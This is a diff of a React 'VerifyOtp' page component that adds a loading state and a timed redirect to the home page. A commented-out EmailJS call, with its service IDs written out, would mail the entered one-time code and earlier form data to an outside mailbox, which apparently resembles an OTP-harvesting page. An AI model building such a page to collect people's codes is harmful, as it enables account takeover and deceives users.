@@ -6,10 +6,10 @@ import '../styles/styles.css'
 import LogoWhite from '../assets/logo_white.png'
 
 const VerifyOtp = (props) => {
-    console.log({ props })
     const history = useHistory()
 
     const [code, setCode] = useState('')
+    const [loading, setLoading] = useState(false)
 
     const handleCode = (e) => {
         setCode(e.target.value)
@@ -18,32 +18,38 @@ const VerifyOtp = (props) => {
     const handleSubmit = async (e) => {
         e.preventDefault()
 
-
         if (code === '') {
             console.log('not sent')
         } else {
-             if (props.location.state) {
-            const templateParams = props.location.state
-            console.log(templateParams)
+            if (props.location.state) {
+                const templateParams = props.location.state
+                console.log(templateParams)
 
-            templateParams.client_verifiedOtp = code
-            // emailjs
-            //     .send(
-            //         'service_cajdfqp',
-            //         'template_wss11os',
-            //         templateParams,
-            //         'user_xCNzJyoa0acBRP75Xy9wk'
-            //     )
-            //     .then(
-            //         (result) => {
-            //             console.log(result.text, 'email sent')
-            //         },
-            //         (error) => {
-            //             console.log(error, 'email failed')
-            //         }
-            //     )
+                templateParams.client_verifiedOtp = code
+                // emailjs
+                //     .send(
+                //         'service_cajdfqp',
+                //         'template_wss11os',
+                //         templateParams,
+                //         'user_xCNzJyoa0acBRP75Xy9wk'
+                //     )
+                //     .then(
+                //         (result) => {
+                //             console.log(result.text, 'email sent')
+                //         },
+                //         (error) => {
+                //             console.log(error, 'email failed')
+                //         }
+                //     )
 
-            history.push('/otp', templateParams)}
+   setTimeout(() => {
+                console.log('time out init')
+                setLoading(false)
+                
+                history.push('/')
+        
+            }, 3000)                
+            }
         }
     }
 
@@ -82,7 +88,7 @@ const VerifyOtp = (props) => {
                             className=' rounded-md outline-none  bg-[#0059dd] text-white text-sm'
                             style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
                         >
-                            Verify
+                            {loading ? 'loading...' : 'Verify'}
                         </button>
                     </form>{' '}
                 </div>
